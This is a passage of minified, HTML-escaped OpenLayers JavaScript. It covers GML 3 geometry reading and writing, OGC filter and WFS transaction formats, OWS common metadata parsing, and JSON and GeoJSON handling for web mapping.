b=this.createElementNSPlus("feature:"+this.featureType,&#123;attributes:&#123;fid:a.fid&#125;&#125;);a.geometry&amp;&amp;this.writeNode("feature:_geometry",a.geometry,b);for(var c in a.attributes)&#123;var d=a.attributes[c];null!=d&amp;&amp;this.writeNode("feature:_attribute",&#123;name:c,value:d&#125;,b)&#125;return b&#125;,_geometry:function(a)&#123;this.externalProjection&amp;&amp;this.internalProjection&amp;&amp;(a=a.clone().transform(this.internalProjection,this.externalProjection));var b=this.createElementNSPlus("feature:"+this.geometryName);a=this.writeNode("gml:"+this.geometryTypes[a.CLASS_NAME],a,b);this.srsName&amp;&amp;a.setAttribute("srsName",this.srsName);return b&#125;,_attribute:function(a)&#123;return this.createElementNSPlus("feature:"+a.name,&#123;value:a.value&#125;)&#125;&#125;,wfs:&#123;FeatureCollection:function(a)&#123;for(var b=this.createElementNSPlus("wfs:FeatureCollection"),c=0,d=a.length;c&lt;d;++c)this.writeNode("gml:featureMember",a[c],b);return b&#125;&#125;&#125;,setGeometryTypes:function()&#123;this.geometryTypes=&#123;"OpenLayers.Geometry.Point":"Point","OpenLayers.Geometry.MultiPoint":"MultiPoint","OpenLayers.Geometry.LineString":"LineString","OpenLayers.Geometry.MultiLineString":"MultiLineString","OpenLayers.Geometry.Polygon":"Polygon","OpenLayers.Geometry.MultiPolygon":"MultiPolygon","OpenLayers.Geometry.Collection":"GeometryCollection"&#125;&#125;,CLASS_NAME:"OpenLayers.Format.GML.Base"&#125;);OpenLayers.Format.GML.v3=OpenLayers.Class(OpenLayers.Format.GML.Base,&#123;schemaLocation:"http://www.opengis.net/gml http://schemas.opengis.net/gml/3.1.1/profiles/gmlsfProfile/1.0.0/gmlsf.xsd",curve:!1,multiCurve:!0,surface:!1,multiSurface:!0,initialize:function(a)&#123;OpenLayers.Format.GML.Base.prototype.initialize.apply(this,[a])&#125;,readers:&#123;gml:OpenLayers.Util.applyDefaults(&#123;_inherit:function(a,b,c)&#123;if(a=parseInt(a.getAttribute("srsDimension"),10)||c&amp;&amp;c.srsDimension)b.srsDimension=a&#125;,featureMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Curve:function(a,b)&#123;var c=&#123;points:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);b.components||(b.components=[]);b.components.push(new OpenLayers.Geometry.LineString(c.points))&#125;,segments:function(a,b)&#123;this.readChildNodes(a,b)&#125;,LineStringSegment:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);c.points&amp;&amp;Array.prototype.push.apply(b.points,c.points)&#125;,pos:function(a,b)&#123;var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(this.regExes.splitSpace),c=this.xy?new OpenLayers.Geometry.Point(c[0],c[1],c[2]):new OpenLayers.Geometry.Point(c[1],c[0],c[2]);b.points=[c]&#125;,posList:function(a,b)&#123;for(var c=this.getChildValue(a).replace(this.regExes.trimSpace,"").split(this.regExes.splitSpace),d=b.srsDimension||parseInt(a.getAttribute("srsDimension")||a.getAttribute("dimension"),10)||2,e,f,g,h=Array(c.length/d),k=0,l=c.length;k&lt;l;k+=d)e=c[k],f=c[k+1],g=2==d?void 0:c[k+2],h[k/d]=this.xy?new OpenLayers.Geometry.Point(e,f,g):new OpenLayers.Geometry.Point(f,e,g);b.points=h&#125;,Surface:function(a,b)&#123;this.readChildNodes(a,b)&#125;,patches:function(a,b)&#123;this.readChildNodes(a,b)&#125;,PolygonPatch:function(a,b)&#123;this.readers.gml.Polygon.apply(this,[a,b])&#125;,exterior:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.outer=c.components[0]&#125;,interior:function(a,b)&#123;var c=&#123;&#125;;this.readChildNodes(a,c);b.inner.push(c.components[0])&#125;,MultiCurve:function(a,b)&#123;var c=&#123;components:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0&lt;c.components.length&amp;&amp;(b.components=[new OpenLayers.Geometry.MultiLineString(c.components)])&#125;,curveMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;,MultiSurface:function(a,b)&#123;var c=&#123;components:[]&#125;;this.readers.gml._inherit.apply(this,[a,c,b]);this.readChildNodes(a,c);0&lt;c.components.length&amp;&amp;(b.components=[new OpenLayers.Geometry.MultiPolygon(c.components)])&#125;,surfaceMember:function(a,b)&#123;this.readChildNodes(a,b)&#125;,surfaceMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,pointMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,lineStringMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,polygonMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,geometryMembers:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Envelope:function(a,b)&#123;var c=&#123;points:Array(2)&#125;;this.readChildNodes(a,c);b.components||(b.components=[]);var d=c.points[0],c=c.points[1];b.components.push(new OpenLayers.Bounds(d.x,d.y,c.x,c.y))&#125;,lowerCorner:function(a,b)&#123;var c=&#123;&#125;;this.readers.gml.pos.apply(this,[a,c]);b.points[0]=c.points[0]&#125;,upperCorner:function(a,b)&#123;var c=&#123;&#125;;this.readers.gml.pos.apply(this,[a,c]);b.points[1]=c.points[0]&#125;&#125;,OpenLayers.Format.GML.Base.prototype.readers.gml),feature:OpenLayers.Format.GML.Base.prototype.readers.feature,wfs:OpenLayers.Format.GML.Base.prototype.readers.wfs&#125;,write:function(a)&#123;var b;b=OpenLayers.Util.isArray(a)?"featureMembers":"featureMember";a=this.writeNode("gml:"+b,a);this.setAttributeNS(a,this.namespaces.xsi,"xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[a])&#125;,writers:&#123;gml:OpenLayers.Util.applyDefaults(&#123;featureMembers:function(a)&#123;for(var b=this.createElementNSPlus("gml:featureMembers"),c=0,d=a.length;c&lt;d;++c)this.writeNode("feature:_typeName",a[c],b);return b&#125;,Point:function(a)&#123;var b=this.createElementNSPlus("gml:Point");this.writeNode("pos",a,b);return b&#125;,pos:function(a)&#123;return this.createElementNSPlus("gml:pos",&#123;value:this.xy?a.x+" "+a.y:a.y+" "+a.x&#125;)&#125;,LineString:function(a)&#123;var b=this.createElementNSPlus("gml:LineString");this.writeNode("posList",a.components,b);return b&#125;,Curve:function(a)&#123;var b=this.createElementNSPlus("gml:Curve");this.writeNode("segments",a,b);return b&#125;,segments:function(a)&#123;var b=this.createElementNSPlus("gml:segments");this.writeNode("LineStringSegment",a,b);return b&#125;,LineStringSegment:function(a)&#123;var b=this.createElementNSPlus("gml:LineStringSegment");this.writeNode("posList",a.components,b);return b&#125;,posList:function(a)&#123;for(var b=a.length,c=Array(b),d,e=0;e&lt;b;++e)d=a[e],c[e]=this.xy?d.x+" "+d.y:d.y+" "+d.x;return this.createElementNSPlus("gml:posList",&#123;value:c.join(" ")&#125;)&#125;,Surface:function(a)&#123;var b=this.createElementNSPlus("gml:Surface");this.writeNode("patches",a,b);return b&#125;,patches:function(a)&#123;var b=this.createElementNSPlus("gml:patches");this.writeNode("PolygonPatch",a,b);return b&#125;,PolygonPatch:function(a)&#123;var b=this.createElementNSPlus("gml:PolygonPatch",&#123;attributes:&#123;interpolation:"planar"&#125;&#125;);this.writeNode("exterior",a.components[0],b);for(var c=1,d=a.components.length;c&lt;d;++c)this.writeNode("interior",a.components[c],b);return b&#125;,Polygon:function(a)&#123;var b=this.createElementNSPlus("gml:Polygon");this.writeNode("exterior",a.components[0],b);for(var c=1,d=a.components.length;c&lt;d;++c)this.writeNode("interior",a.components[c],b);return b&#125;,exterior:function(a)&#123;var b=this.createElementNSPlus("gml:exterior");this.writeNode("LinearRing",a,b);return b&#125;,interior:function(a)&#123;var b=this.createElementNSPlus("gml:interior");this.writeNode("LinearRing",a,b);return b&#125;,LinearRing:function(a)&#123;var b=this.createElementNSPlus("gml:LinearRing");this.writeNode("posList",a.components,b);return b&#125;,MultiCurve:function(a)&#123;var b=this.createElementNSPlus("gml:MultiCurve");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("curveMember",a[c],b);return b&#125;,curveMember:function(a)&#123;var b=this.createElementNSPlus("gml:curveMember");this.curve?this.writeNode("Curve",a,b):this.writeNode("LineString",a,b);return b&#125;,MultiSurface:function(a)&#123;var b=this.createElementNSPlus("gml:MultiSurface");a=a.components||[a];for(var c=0,d=a.length;c&lt;d;++c)this.writeNode("surfaceMember",a[c],b);return b&#125;,surfaceMember:function(a)&#123;var b=this.createElementNSPlus("gml:surfaceMember");this.surface?this.writeNode("Surface",a,b):this.writeNode("Polygon",a,b);return b&#125;,Envelope:function(a)&#123;var b=this.createElementNSPlus("gml:Envelope");this.writeNode("lowerCorner",a,b);this.writeNode("upperCorner",a,b);this.srsName&amp;&amp;b.setAttribute("srsName",this.srsName);return b&#125;,lowerCorner:function(a)&#123;return this.createElementNSPlus("gml:lowerCorner",&#123;value:this.xy?a.left+" "+a.bottom:a.bottom+" "+a.left&#125;)&#125;,upperCorner:function(a)&#123;return this.createElementNSPlus("gml:upperCorner",&#123;value:this.xy?a.right+" "+a.top:a.top+" "+a.right&#125;)&#125;&#125;,OpenLayers.Format.GML.Base.prototype.writers.gml),feature:OpenLayers.Format.GML.Base.prototype.writers.feature,wfs:OpenLayers.Format.GML.Base.prototype.writers.wfs&#125;,setGeometryTypes:function()&#123;this.geometryTypes=&#123;"OpenLayers.Geometry.Point":"Point","OpenLayers.Geometry.MultiPoint":"MultiPoint","OpenLayers.Geometry.LineString":!0===this.curve?"Curve":"LineString","OpenLayers.Geometry.MultiLineString":!1===this.multiCurve?"MultiLineString":"MultiCurve","OpenLayers.Geometry.Polygon":!0===this.surface?"Surface":"Polygon","OpenLayers.Geometry.MultiPolygon":!1===this.multiSurface?"MultiPolygon":"MultiSurface","OpenLayers.Geometry.Collection":"GeometryCollection"&#125;&#125;,CLASS_NAME:"OpenLayers.Format.GML.v3"&#125;);OpenLayers.Format.Filter.v1_1_0=OpenLayers.Class(OpenLayers.Format.GML.v3,OpenLayers.Format.Filter.v1,&#123;VERSION:"1.1.0",schemaLocation:"http://www.opengis.net/ogc/filter/1.1.0/filter.xsd",initialize:function(a)&#123;OpenLayers.Format.GML.v3.prototype.initialize.apply(this,[a])&#125;,readers:&#123;ogc:OpenLayers.Util.applyDefaults(&#123;PropertyIsEqualTo:function(a,b)&#123;var c=a.getAttribute("matchCase"),c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.EQUAL_TO,matchCase:!("false"===c||"0"===c)&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsNotEqualTo:function(a,b)&#123;var c=a.getAttribute("matchCase"),c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.NOT_EQUAL_TO,matchCase:!("false"===c||"0"===c)&#125;);this.readChildNodes(a,c);b.filters.push(c)&#125;,PropertyIsLike:function(a,b)&#123;var c=new OpenLayers.Filter.Comparison(&#123;type:OpenLayers.Filter.Comparison.LIKE&#125;);this.readChildNodes(a,c);var d=a.getAttribute("wildCard"),e=a.getAttribute("singleChar"),f=a.getAttribute("escapeChar");c.value2regex(d,e,f);b.filters.push(c)&#125;&#125;,OpenLayers.Format.Filter.v1.prototype.readers.ogc),gml:OpenLayers.Format.GML.v3.prototype.readers.gml,feature:OpenLayers.Format.GML.v3.prototype.readers.feature&#125;,writers:&#123;ogc:OpenLayers.Util.applyDefaults(&#123;PropertyIsEqualTo:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsEqualTo",&#123;attributes:&#123;matchCase:a.matchCase&#125;&#125;);this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsNotEqualTo:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsNotEqualTo",&#123;attributes:&#123;matchCase:a.matchCase&#125;&#125;);this.writeNode("PropertyName",a,b);this.writeOgcExpression(a.value,b);return b&#125;,PropertyIsLike:function(a)&#123;var b=this.createElementNSPlus("ogc:PropertyIsLike",&#123;attributes:&#123;matchCase:a.matchCase,wildCard:"*",singleChar:".",escapeChar:"!"&#125;&#125;);this.writeNode("PropertyName",a,b);this.writeNode("Literal",a.regex2value(),b);return b&#125;,BBOX:function(a)&#123;var b=this.createElementNSPlus("ogc:BBOX");a.property&amp;&amp;this.writeNode("PropertyName",a,b);var c=this.writeNode("gml:Envelope",a.value);a.projection&amp;&amp;c.setAttribute("srsName",a.projection);b.appendChild(c);return b&#125;,SortBy:function(a)&#123;for(var b=this.createElementNSPlus("ogc:SortBy"),c=0,d=a.length;c&lt;d;c++)this.writeNode("ogc:SortProperty",a[c],b);return b&#125;,SortProperty:function(a)&#123;var b=this.createElementNSPlus("ogc:SortProperty");this.writeNode("ogc:PropertyName",a,b);this.writeNode("ogc:SortOrder","DESC"==a.order?"DESC":"ASC",b);return b&#125;,SortOrder:function(a)&#123;return this.createElementNSPlus("ogc:SortOrder",&#123;value:a&#125;)&#125;&#125;,OpenLayers.Format.Filter.v1.prototype.writers.ogc),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature&#125;,writeSpatial:function(a,b)&#123;var c=this.createElementNSPlus("ogc:"+b);this.writeNode("PropertyName",a,c);if(a.value instanceof OpenLayers.Filter.Function)this.writeNode("Function",a.value,c);else&#123;var d;d=a.value instanceof OpenLayers.Geometry?this.writeNode("feature:_geometry",a.value).firstChild:this.writeNode("gml:Envelope",a.value);a.projection&amp;&amp;d.setAttribute("srsName",a.projection);c.appendChild(d)&#125;return c&#125;,CLASS_NAME:"OpenLayers.Format.Filter.v1_1_0"&#125;);OpenLayers.Format.OWSCommon=OpenLayers.Class(OpenLayers.Format.XML.VersionedOGC,&#123;defaultVersion:"1.0.0",getVersion:function(a,b)&#123;var c=this.version;if(!c)&#123;var d=a.getAttribute("xmlns:ows");d&amp;&amp;"1.1"===d.substring(d.lastIndexOf("/")+1)&amp;&amp;(c="1.1.0");c||(c=this.defaultVersion)&#125;return c&#125;,CLASS_NAME:"OpenLayers.Format.OWSCommon"&#125;);OpenLayers.Format.OWSCommon.v1=OpenLayers.Class(OpenLayers.Format.XML,&#123;regExes:&#123;trimSpace:/^\s*|\s*$/g,removeSpace:/\s*/g,splitSpace:/\s+/,trimComma:/\s*,\s*/g&#125;,read:function(a,b)&#123;OpenLayers.Util.applyDefaults(b,this.options);var c=&#123;&#125;;this.readChildNodes(a,c);return c&#125;,readers:&#123;ows:&#123;Exception:function(a,b)&#123;var c=&#123;code:a.getAttribute("exceptionCode"),locator:a.getAttribute("locator"),texts:[]&#125;;b.exceptions.push(c);this.readChildNodes(a,c)&#125;,ExceptionText:function(a,b)&#123;var c=this.getChildValue(a);b.texts.push(c)&#125;,ServiceIdentification:function(a,b)&#123;b.serviceIdentification=&#123;&#125;;this.readChildNodes(a,b.serviceIdentification)&#125;,Title:function(a,b)&#123;b.title=this.getChildValue(a)&#125;,Abstract:function(a,b)&#123;b["abstract"]=this.getChildValue(a)&#125;,Keywords:function(a,b)&#123;b.keywords=&#123;&#125;;this.readChildNodes(a,b.keywords)&#125;,Keyword:function(a,b)&#123;b[this.getChildValue(a)]=!0&#125;,ServiceType:function(a,b)&#123;b.serviceType=&#123;codeSpace:a.getAttribute("codeSpace"),value:this.getChildValue(a)&#125;&#125;,ServiceTypeVersion:function(a,b)&#123;b.serviceTypeVersion=this.getChildValue(a)&#125;,Fees:function(a,b)&#123;b.fees=this.getChildValue(a)&#125;,AccessConstraints:function(a,b)&#123;b.accessConstraints=this.getChildValue(a)&#125;,ServiceProvider:function(a,b)&#123;b.serviceProvider=&#123;&#125;;this.readChildNodes(a,b.serviceProvider)&#125;,ProviderName:function(a,b)&#123;b.providerName=this.getChildValue(a)&#125;,ProviderSite:function(a,b)&#123;b.providerSite=this.getAttributeNS(a,this.namespaces.xlink,"href")&#125;,ServiceContact:function(a,b)&#123;b.serviceContact=&#123;&#125;;this.readChildNodes(a,b.serviceContact)&#125;,IndividualName:function(a,b)&#123;b.individualName=this.getChildValue(a)&#125;,PositionName:function(a,b)&#123;b.positionName=this.getChildValue(a)&#125;,ContactInfo:function(a,b)&#123;b.contactInfo=&#123;&#125;;this.readChildNodes(a,b.contactInfo)&#125;,Phone:function(a,b)&#123;b.phone=&#123;&#125;;this.readChildNodes(a,b.phone)&#125;,Voice:function(a,b)&#123;b.voice=this.getChildValue(a)&#125;,Address:function(a,b)&#123;b.address=&#123;&#125;;this.readChildNodes(a,b.address)&#125;,DeliveryPoint:function(a,b)&#123;b.deliveryPoint=this.getChildValue(a)&#125;,City:function(a,b)&#123;b.city=this.getChildValue(a)&#125;,AdministrativeArea:function(a,b)&#123;b.administrativeArea=this.getChildValue(a)&#125;,PostalCode:function(a,b)&#123;b.postalCode=this.getChildValue(a)&#125;,Country:function(a,b)&#123;b.country=this.getChildValue(a)&#125;,ElectronicMailAddress:function(a,b)&#123;b.electronicMailAddress=this.getChildValue(a)&#125;,Role:function(a,b)&#123;b.role=this.getChildValue(a)&#125;,OperationsMetadata:function(a,b)&#123;b.operationsMetadata=&#123;&#125;;this.readChildNodes(a,b.operationsMetadata)&#125;,Operation:function(a,b)&#123;var c=a.getAttribute("name");b[c]=&#123;&#125;;this.readChildNodes(a,b[c])&#125;,DCP:function(a,b)&#123;b.dcp=&#123;&#125;;this.readChildNodes(a,b.dcp)&#125;,HTTP:function(a,b)&#123;b.http=&#123;&#125;;this.readChildNodes(a,b.http)&#125;,Get:function(a,b)&#123;b.get||(b.get=[]);var c=&#123;url:this.getAttributeNS(a,this.namespaces.xlink,"href")&#125;;this.readChildNodes(a,c);b.get.push(c)&#125;,Post:function(a,b)&#123;b.post||(b.post=[]);var c=&#123;url:this.getAttributeNS(a,this.namespaces.xlink,"href")&#125;;this.readChildNodes(a,c);b.post.push(c)&#125;,Parameter:function(a,b)&#123;b.parameters||(b.parameters=&#123;&#125;);var c=a.getAttribute("name");b.parameters[c]=&#123;&#125;;this.readChildNodes(a,b.parameters[c])&#125;,Constraint:function(a,b)&#123;b.constraints||(b.constraints=&#123;&#125;);var c=a.getAttribute("name");b.constraints[c]=&#123;&#125;;this.readChildNodes(a,b.constraints[c])&#125;,Value:function(a,b)&#123;b[this.getChildValue(a)]=!0&#125;,OutputFormat:function(a,b)&#123;b.formats.push(&#123;value:this.getChildValue(a)&#125;);this.readChildNodes(a,b)&#125;,WGS84BoundingBox:function(a,b)&#123;var c=&#123;&#125;;c.crs=a.getAttribute("crs");b.BoundingBox?b.BoundingBox.push(c):(b.projection=c.crs,c=b);this.readChildNodes(a,c)&#125;,BoundingBox:function(a,b)&#123;this.readers.ows.WGS84BoundingBox.apply(this,[a,b])&#125;,LowerCorner:function(a,b)&#123;var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace);b.left=c[0];b.bottom=c[1]&#125;,UpperCorner:function(a,b)&#123;var c=this.getChildValue(a).replace(this.regExes.trimSpace,""),c=c.replace(this.regExes.trimComma,","),c=c.split(this.regExes.splitSpace);b.right=c[0];b.top=c[1];b.bounds=new OpenLayers.Bounds(b.left,b.bottom,b.right,b.top);delete b.left;delete b.bottom;delete b.right;delete b.top&#125;,Language:function(a,b)&#123;b.language=this.getChildValue(a)&#125;&#125;&#125;,writers:&#123;ows:&#123;BoundingBox:function(a,b)&#123;var c=this.createElementNSPlus(b||"ows:BoundingBox",&#123;attributes:&#123;crs:a.projection&#125;&#125;);this.writeNode("ows:LowerCorner",a,c);this.writeNode("ows:UpperCorner",a,c);return c&#125;,LowerCorner:function(a)&#123;return this.createElementNSPlus("ows:LowerCorner",&#123;value:a.bounds.left+" "+a.bounds.bottom&#125;)&#125;,UpperCorner:function(a)&#123;return this.createElementNSPlus("ows:UpperCorner",&#123;value:a.bounds.right+" "+a.bounds.top&#125;)&#125;,Identifier:function(a)&#123;return this.createElementNSPlus("ows:Identifier",&#123;value:a&#125;)&#125;,Title:function(a)&#123;return this.createElementNSPlus("ows:Title",&#123;value:a&#125;)&#125;,Abstract:function(a)&#123;return this.createElementNSPlus("ows:Abstract",&#123;value:a&#125;)&#125;,OutputFormat:function(a)&#123;return this.createElementNSPlus("ows:OutputFormat",&#123;value:a&#125;)&#125;&#125;&#125;,CLASS_NAME:"OpenLayers.Format.OWSCommon.v1"&#125;);OpenLayers.Format.OWSCommon.v1_0_0=OpenLayers.Class(OpenLayers.Format.OWSCommon.v1,&#123;namespaces:&#123;ows:"http://www.opengis.net/ows",xlink:"http://www.w3.org/1999/xlink"&#125;,readers:&#123;ows:OpenLayers.Util.applyDefaults(&#123;ExceptionReport:function(a,b)&#123;b.success=!1;b.exceptionReport=&#123;version:a.getAttribute("version"),language:a.getAttribute("language"),exceptions:[]&#125;;this.readChildNodes(a,b.exceptionReport)&#125;&#125;,OpenLayers.Format.OWSCommon.v1.prototype.readers.ows)&#125;,writers:&#123;ows:OpenLayers.Format.OWSCommon.v1.prototype.writers.ows&#125;,CLASS_NAME:"OpenLayers.Format.OWSCommon.v1_0_0"&#125;);OpenLayers.Format.WFST.v1_1_0=OpenLayers.Class(OpenLayers.Format.Filter.v1_1_0,OpenLayers.Format.WFST.v1,&#123;version:"1.1.0",schemaLocations:&#123;wfs:"http://schemas.opengis.net/wfs/1.1.0/wfs.xsd"&#125;,initialize:function(a)&#123;OpenLayers.Format.Filter.v1_1_0.prototype.initialize.apply(this,[a]);OpenLayers.Format.WFST.v1.prototype.initialize.apply(this,[a])&#125;,readNode:function(a,b,c)&#123;return OpenLayers.Format.GML.v3.prototype.readNode.apply(this,arguments)&#125;,readers:&#123;wfs:OpenLayers.Util.applyDefaults(&#123;FeatureCollection:function(a,b)&#123;b.numberOfFeatures=parseInt(a.getAttribute("numberOfFeatures"));OpenLayers.Format.WFST.v1.prototype.readers.wfs.FeatureCollection.apply(this,arguments)&#125;,TransactionResponse:function(a,b)&#123;b.insertIds=[];b.success=!1;this.readChildNodes(a,b)&#125;,TransactionSummary:function(a,b)&#123;b.success=!0&#125;,InsertResults:function(a,b)&#123;this.readChildNodes(a,b)&#125;,Feature:function(a,b)&#123;var c=&#123;fids:[]&#125;;this.readChildNodes(a,c);b.insertIds.push(c.fids[0])&#125;&#125;,OpenLayers.Format.WFST.v1.prototype.readers.wfs),gml:OpenLayers.Format.GML.v3.prototype.readers.gml,feature:OpenLayers.Format.GML.v3.prototype.readers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.readers.ogc,ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows&#125;,writers:&#123;wfs:OpenLayers.Util.applyDefaults(&#123;GetFeature:function(a)&#123;var b=OpenLayers.Format.WFST.v1.prototype.writers.wfs.GetFeature.apply(this,arguments);a&amp;&amp;this.setAttributes(b,&#123;resultType:a.resultType,startIndex:a.startIndex,count:a.count&#125;);return b&#125;,Query:function(a)&#123;a=OpenLayers.Util.extend(&#123;featureNS:this.featureNS,featurePrefix:this.featurePrefix,featureType:this.featureType,srsName:this.srsName&#125;,a);var b=a.featurePrefix,c=this.createElementNSPlus("wfs:Query",&#123;attributes:&#123;typeName:(b?b+":":"")+a.featureType,srsName:a.srsName&#125;&#125;);a.featureNS&amp;&amp;c.setAttribute("xmlns:"+b,a.featureNS);if(a.propertyNames)for(var b=0,d=a.propertyNames.length;b&lt;d;b++)this.writeNode("wfs:PropertyName",&#123;property:a.propertyNames[b]&#125;,c);a.filter&amp;&amp;(OpenLayers.Format.WFST.v1_1_0.prototype.setFilterProperty.call(this,a.filter),this.writeNode("ogc:Filter",a.filter,c));return c&#125;,PropertyName:function(a)&#123;return this.createElementNSPlus("wfs:PropertyName",&#123;value:a.property&#125;)&#125;&#125;,OpenLayers.Format.WFST.v1.prototype.writers.wfs),gml:OpenLayers.Format.GML.v3.prototype.writers.gml,feature:OpenLayers.Format.GML.v3.prototype.writers.feature,ogc:OpenLayers.Format.Filter.v1_1_0.prototype.writers.ogc&#125;,CLASS_NAME:"OpenLayers.Format.WFST.v1_1_0"&#125;);OpenLayers.Protocol=OpenLayers.Class(&#123;format:null,options:null,autoDestroy:!0,defaultFilter:null,initialize:function(a)&#123;a=a||&#123;&#125;;OpenLayers.Util.extend(this,a);this.options=a&#125;,mergeWithDefaultFilter:function(a)&#123;return a&amp;&amp;this.defaultFilter?new OpenLayers.Filter.Logical(&#123;type:OpenLayers.Filter.Logical.AND,filters:[this.defaultFilter,a]&#125;):a||this.defaultFilter||void 0&#125;,destroy:function()&#123;this.format=this.options=null&#125;,read:function(a)&#123;a=a||&#123;&#125;;a.filter=this.mergeWithDefaultFilter(a.filter)&#125;,create:function()&#123;&#125;,update:function()&#123;&#125;,"delete":function()&#123;&#125;,commit:function()&#123;&#125;,abort:function(a)&#123;&#125;,createCallback:function(a,b,c)&#123;return OpenLayers.Function.bind(function()&#123;a.apply(this,[b,c])&#125;,this)&#125;,CLASS_NAME:"OpenLayers.Protocol"&#125;);OpenLayers.Protocol.Response=OpenLayers.Class(&#123;code:null,requestType:null,last:!0,features:null,data:null,reqFeatures:null,priv:null,error:null,initialize:function(a)&#123;OpenLayers.Util.extend(this,a)&#125;,success:function()&#123;return 0&lt;this.code&#125;,CLASS_NAME:"OpenLayers.Protocol.Response"&#125;);OpenLayers.Protocol.Response.SUCCESS=1;OpenLayers.Protocol.Response.FAILURE=0;OpenLayers.Format.JSON=OpenLayers.Class(OpenLayers.Format,&#123;indent:" ",space:" ",newline:"\n",level:0,pretty:!1,nativeJSON:function()&#123;return!(!window.JSON||"function"!=typeof JSON.parse||"function"!=typeof JSON.stringify)&#125;(),read:function(a,b)&#123;var c;if(this.nativeJSON)c=JSON.parse(a,b);else try&#123;if(/^[\],:&#123;&#125;\s]*$/.test(a.replace(/\\["\\\/bfnrtu]/g,"@").replace(/"[^"\\\n\r]*"|true|false|null|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?/g,"]").replace(/(?:^|:|,)(?:\s*\[)+/g,""))&amp;&amp;(c=eval("("+a+")"),"function"===typeof b))&#123;var d=function(a,c)&#123;if(c&amp;&amp;"object"===typeof c)for(var e in c)c.hasOwnProperty(e)&amp;&amp;(c[e]=d(e,c[e]));return b(a,c)&#125;;c=d("",c)&#125;&#125;catch(e)&#123;&#125;this.keepData&amp;&amp;(this.data=c);return c&#125;,write:function(a,b)&#123;this.pretty=!!b;var c=null,d=typeof a;if(this.serialize[d])try&#123;c=!this.pretty&amp;&amp;this.nativeJSON?JSON.stringify(a):this.serialize[d].apply(this,[a])&#125;catch(e)&#123;OpenLayers.Console.error("Trouble serializing: "+e)&#125;return c&#125;,writeIndent:function()&#123;var a=[];if(this.pretty)for(var b=0;b&lt;this.level;++b)a.push(this.indent);return a.join("")&#125;,writeNewline:function()&#123;return this.pretty?this.newline:""&#125;,writeSpace:function()&#123;return this.pretty?this.space:""&#125;,serialize:&#123;object:function(a)&#123;if(null==a)return"null";if(a.constructor==Date)return this.serialize.date.apply(this,[a]);if(a.constructor==Array)return this.serialize.array.apply(this,[a]);var b=["&#123;"];this.level+=1;var c,d,e,f=!1;for(c in a)a.hasOwnProperty(c)&amp;&amp;(d=OpenLayers.Format.JSON.prototype.write.apply(this,[c,this.pretty]),e=OpenLayers.Format.JSON.prototype.write.apply(this,[a[c],this.pretty]),null!=d&amp;&amp;null!=e&amp;&amp;(f&amp;&amp;b.push(","),b.push(this.writeNewline(),this.writeIndent(),d,":",this.writeSpace(),e),f=!0));this.level-=1;b.push(this.writeNewline(),this.writeIndent(),"&#125;");return b.join("")&#125;,array:function(a)&#123;var b,c=["["];this.level+=1;for(var d=0,e=a.length;d&lt;e;++d)b=OpenLayers.Format.JSON.prototype.write.apply(this,[a[d],this.pretty]),null!=b&amp;&amp;(0&lt;d&amp;&amp;c.push(","),c.push(this.writeNewline(),this.writeIndent(),b));this.level-=1;c.push(this.writeNewline(),this.writeIndent(),"]");return c.join("")&#125;,string:function(a)&#123;var b=&#123;"\b":"\\b","\t":"\\t","\n":"\\n","\f":"\\f","\r":"\\r",'"':'\\"',"\\":"\\\\"&#125;;return/["\\\x00-\x1f]/.test(a)?'"'+a.replace(/([\x00-\x1f\\"])/g,function(a,d)&#123;var e=b[d];if(e)return e;e=d.charCodeAt();return"\\u00"+Math.floor(e/16).toString(16)+(e%16).toString(16)&#125;)+'"':'"'+a+'"'&#125;,number:function(a)&#123;return isFinite(a)?String(a):"null"&#125;,"boolean":function(a)&#123;return String(a)&#125;,date:function(a)&#123;function b(a)&#123;return 10&gt;a?"0"+a:a&#125;return'"'+a.getFullYear()+"-"+b(a.getMonth()+1)+"-"+b(a.getDate())+"T"+b(a.getHours())+":"+b(a.getMinutes())+":"+b(a.getSeconds())+'"'&#125;&#125;,CLASS_NAME:"OpenLayers.Format.JSON"&#125;);OpenLayers.Format.GeoJSON=OpenLayers.Class(OpenLayers.Format.JSON,&#123;ignoreExtraDims:!1,read:function(a,b,c)&#123;b=b?b:"FeatureCollection";var d=null,e=null,e="string"==typeof a?OpenLayers.Format.JSON.prototype.read.apply(this,[a,c]):a;if(!e)OpenLayers.Console.error("Bad JSON: "+a);else if("string"!=typeof e.type)OpenLayers.Console.error("Bad GeoJSON - no type: "+a);else if(this.isValidType(e,b))switch(b)&#123;case "Geometry":try&#123;d=this.parseGeometry(e)&#125;catch(f)&#123;OpenLayers.Console.error(f)&#125;break;case "Feature":try&#123;d=this.parseFeature(e),d.type="Feature"&#125;catch(g)&#123;OpenLayers.Console.error(g)&#125;break;case "FeatureCollection":switch(d=[],e.type)&#123;case 